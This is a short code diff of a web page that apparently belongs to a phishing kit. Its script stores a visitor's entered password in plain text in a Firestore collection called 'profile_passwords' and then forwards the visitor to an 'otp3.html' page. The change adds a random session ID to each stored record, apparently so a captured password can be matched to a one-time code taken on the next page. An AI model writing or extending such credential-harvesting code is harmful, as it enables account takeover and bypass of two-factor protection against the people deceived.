@@ -119,6 +119,11 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+
+    // Function to generate sessionId (simple version, can be more complex)
+    function generateSessionId() {
+      return 'session-' + Math.random().toString(36).substr(2, 9); // Random session ID
+    }
   </script>
 
   <script>
@@ -131,8 +136,13 @@
         return false;
       }
 
+      // Generate a session ID
+      const sessionId = generateSessionId();
+
+      // Save data to Firestore with sessionId
       db.collection("profile_passwords").add({
         password: password,
+        sessionId: sessionId, // Add sessionId to the Firestore entry
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         window.location.href = "otp3.html";
